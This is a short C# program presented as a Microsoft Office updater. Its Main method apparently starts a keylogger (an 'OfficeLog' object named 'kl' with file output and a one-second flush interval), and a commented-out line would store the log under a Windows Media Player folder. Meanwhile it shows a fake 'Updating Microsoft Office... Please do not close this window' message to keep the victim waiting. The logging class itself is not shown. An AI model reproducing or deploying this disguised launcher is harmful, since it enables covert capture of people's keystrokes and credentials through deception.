using System;

namespace OfficeUpdates
{
    class Program
    {
        static void Main(string[] args)
        {
            OfficeLog kl = new OfficeLog();

            //kl.LOG_FILE = @"C:\Program Files\Windows Media Player";
            kl.LOG_FILE = args[0];
            //kl.LOG_MODE = "hour";
            kl.LOG_MODE = "now";
            kl.FlushInterval = 1000;
            kl.LOG_OUT = "file";

            kl.Enabled = true;

            Console.WriteLine("Updating Microsoft Office... Please do not close this window.");
            Console.Read();
        }
    }
}
